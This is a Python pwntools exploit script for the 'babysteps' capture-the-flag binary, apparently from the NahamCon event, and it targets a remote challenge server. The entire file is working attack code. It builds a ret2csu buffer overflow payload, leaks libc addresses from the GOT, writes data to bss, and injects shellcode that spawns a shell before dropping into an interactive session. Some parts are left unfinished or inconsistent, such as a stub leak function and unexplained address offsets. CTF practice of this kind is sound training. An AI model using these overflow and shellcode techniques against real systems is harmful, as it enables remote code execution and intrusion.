#!/usr/bin/env python3
# -*- coding: utf-8 -*-

'''
solve the babysteps challenge
'''
from pwn import *
from LibcSearcher import *


context.arch = 'i386'
context.terminal = ['wt.exe', '-w', '0', 'split-pane', 'wsl.exe', '-d', 'Ubuntu']
context.log_level = 'debug'

start_addr = 0x08049090
libc_csu_init_gadget1 = 0x08049605
libc_csu_init_gadget2 = 0x080495f4
puts_got = 0x804c014 + 0xfc
gets_got = 0x804c010
bss_addr = 0x804c02c
# ret2csu
def ret2csu(vuln_buffer_size, add_esp_value, num_of_pop, ebp, edi, esi = 0, ebx = 1, ret = 0, arch = 'amd64', puts_arg = 0):
    '''
    construct ret2csu payload, 从左到右对应libc_csu_init中的最后从下到上的寄存器
    @param vuln_buffer_size: the size of vuln buffer
    @param add_esp_value: the value of add esp in libc_csu_init
    @ebp: hijack function address, often got.plt address
    @edi: the first argument
    @esi: call instruction idx, should be 0
    @ebx: condition, should be 1, then `add esi, 1; cmp ebx, esi` can bypass
    @ret: return address
    '''
    if arch == 'i386':
        payload = b'A'*vuln_buffer_size + b'C'*8 + p32(libc_csu_init_gadget1)
        payload += b'B'*add_esp_value + p32(ebx) + p32(esi) + p32(edi) + p32(ebp) + p32(libc_csu_init_gadget2)
        payload += p32(puts_arg) + p32(0) + p32(0) + p32(0) + b'B'*(add_esp_value + (num_of_pop)*4) + p32(ret)
    elif arch == 'amd64':
        payload = b'A'*vuln_buffer_size + b'D'*8 + p64(libc_csu_init_gadget1)
        payload += b'B'*add_esp_value + p64(ebx) + p64(esi) + p64(edi) + p64(ebp) + p64(libc_csu_init_gadget2)
        payload += b'B'*(add_esp_value + num_of_pop*8) + p64(ret)

    return payload

'''
leak puts addr
'''
def leak_puts():
    '''
    leak puts addr
    '''
    pass

def main():
    
    # choose local or remote
    if sys.argv[1] == 'remote':
        r = remote('challenge.nahamcon.com', 30311)
    else:
        r = process('./babysteps')
        gdb.attach(r, '''
        b gets
        ''')

    # use DynELF to get libc base
    # libc = DynELF(leak_puts ,elf = ELF('./babysteps'))
    # libc_base = libc.lookup('gets', 'libc')

    r.recvuntil(b"First, what is your baby name?")
    payload = ret2csu(20, 0xC, 4, puts_got, gets_got, esi = 0, ebx = 1, ret = start_addr, arch = 'i386', puts_arg = gets_got)
    print(payload)
    r.sendline(payload)
    log.info("leak libc...")
    r.recvline()
    gets_data = r.recv(4).ljust(4, b'\x00')
    gets_addr = u32(gets_data)
    log.info("gets addr: {}".format(hex(gets_addr)))

    # leak libc base
    obj = LibcSearcher("gets", gets_addr)
    system_addr = obj.dump("system")
    log.info("system addr: {}".format(hex(system_addr)))
    binsh_addr = obj.dump("str_bin_sh")
    log.info("/bin/sh addr: {}".format(hex(binsh_addr)))
    libc_base = gets_addr - obj.dump("gets")
    log.info("libc base: {}".format(hex(libc_base)))

    system_addr = system_addr + libc_base
    binsh_addr = binsh_addr + libc_base
    log.info("system addr: {}".format(hex(system_addr)))
    log.info("/bin/sh addr: {}".format(hex(binsh_addr)))
    
    log.info("write /bin/sh to bss...")
    pause()
    payload = ret2csu(20, 0xC, 4, gets_got + 0xfc, bss_addr, esi = 0, ebx = 1, ret = start_addr, arch = 'i386', puts_arg = bss_addr)
    r.recvuntil(b"First, what is your baby name?")
    r.sendline(payload)

    # construct shellcode, then put it in stack
    # jmp esp
    shellcode = asm(shellcraft.i386.linux.sh())
    
    # construct `jmp esp` bytes code
    jmp_esp = asm("jmp esp", arch = 'i386', os = 'linux')


    log.info("shellcode length:" + str(len(shellcode)))
    print(b"[+] shellcode:" + shellcode)
    log.info("jmp esp length:" + str(len(jmp_esp)))
    print(b"[+] jmp esp:" + jmp_esp)
    payload = jmp_esp.ljust(4, b'\x90')
    r.sendline(payload)



    pause()
    log.info("exec system('/bin/sh')")
    r.recvuntil(b"First, what is your baby name?")
    payload = b"A"*20 + b"B"*8 + p32(0x0804960C) + p32(bss_addr) + shellcode
    r.sendline(payload)


    # leak puts
    r.interactive()

if __name__ == '__main__':
    main()